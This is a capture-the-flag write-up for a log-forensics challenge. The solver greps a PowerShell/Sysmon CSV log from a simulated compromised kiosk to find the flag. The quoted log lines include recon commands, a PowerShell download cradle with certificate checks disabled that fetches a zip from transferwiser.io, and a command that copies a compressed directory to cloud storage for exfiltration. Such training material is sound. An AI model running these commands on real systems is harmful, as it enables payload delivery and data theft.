---
SOURCE: github_CTFs
URL: https://raw.githubusercontent.com/Dvd848/CTFs/master/2022_H4CK1NG_G00GL3/e02c02.md
CHALLENGE: e02c02
EVENT: GitHub - Dvd848/CTFs
TEAM: N/A
CATEGORY: other
DIFFICULTY: Easy
PROTECTIONS: None
KEY_FUNCTIONS: system, read
KEY_TECHNIQUE: The writeup describes a other vulnerability leveraging system, read to hijack the control flow.
---
# Episode 2: Challenge 2

## Description

> After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after. HINT: Use the tool to be forensic in your search.

An archive file was attached.

## Solution

The archive contained two files. First, a README with the following storyline and some additional instructions to setup a docker.

```
Storyline:
Detectorsprotectors.biz is a cybersecurity company who is heavily invested in building software protections that protects flux capacitors on fire protection hardware.

A recent junior hire was tasked with deploying a kiosk machine at the reception to enable guests to quickly check-in. Unfortunately, one of the applications on the kiosk machine was outdated and lacked key patches.

A malicious actor has managed to compromise the machine.

Your task is to follow the log file provided, uncover the actions performed and find the flag.
We suspect that a number of reconnaissance activities have taken place using powershell.exe. The attacker probably made use of a RAT and established an exfiltration channel.
```

And second, a large CSV file:

```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP002/Challenge_02]
└─$ wc -l Episode2-Ch2/CTF\ CSV-EASY-final.csv
4568 Episode2-Ch2/CTF CSV-EASY-final.csv

┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP002/Challenge_02]
└─$ head Episode2-Ch2/CTF\ CSV-EASY-final.csv
datetime,timestamp_desc,action,message,metadata_event_type,vendor_name,product_name,metadata_product_log_id,metadata_product_event_type,principal_user,principal_host,target_user,target_executed_command,security_result_summary
2022-06-24 09:09:48+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Users\Public\svchost.exe,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-Sysmon,6650,1,tech01,kiosk.detectorsprotectors.biz,null,cmd.exe /C net view \\#{remote.host.fqdn} /all
2022-06-24 09:11:48+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Users\Public\svchost.exe,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-Sysmon,6650,1,tech01,kiosk.detectorsprotectors.biz,null,cmd.exe /C tasklist
2022-06-24 10:10:48+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,6650,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:11:44+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,10978,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:10:39+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,6166,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:10:47+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,6583,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:10:22+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,4290,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:10:58+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,7201,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
2022-06-24 10:10:33+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\system32\basic_scanner.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,5568,4103,tech01,kiosk.detectorsprotectors.biz,null,powershell.exe -ExecutionPolicy Bypass -C Import-Module ./basic_scanner.ps1;$ports=@(Top10,Executing Pipeline
```

It was possible to find the flag by simply grepping for `http`:

```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP002/Challenge_02]
└─$ cat Episode2-Ch2/CTF\ CSV-EASY-final.csv | grep "http"
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13639,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13622,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:26:38+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13510,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:26:38+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13499,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:26:38+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13491,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:27:55+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13613,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:26:39+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13512,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13632,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13626,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:26:38+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13509,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:26:38+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13496,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:26:38+00,Event Time,ALLOW,PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1,PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13493,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $True };$web=(New-Object System.Net.WebClient);$result=$web.DownloadFile(""https://transferwiser.io/efdin0i.zip""",Executing Pipeline
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13616,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13636,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
}/$RemoteName;",PROCESS_LAUNCH,Microsoft,Microsoft-Windows-PowerShell,13611,4103,tech01,kiosk.detectorsprotectors.biz,null,"powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
```

The flag: `https://h4ck1ng.google/solve/d3_T3c_i0n_r35P_0ns3`.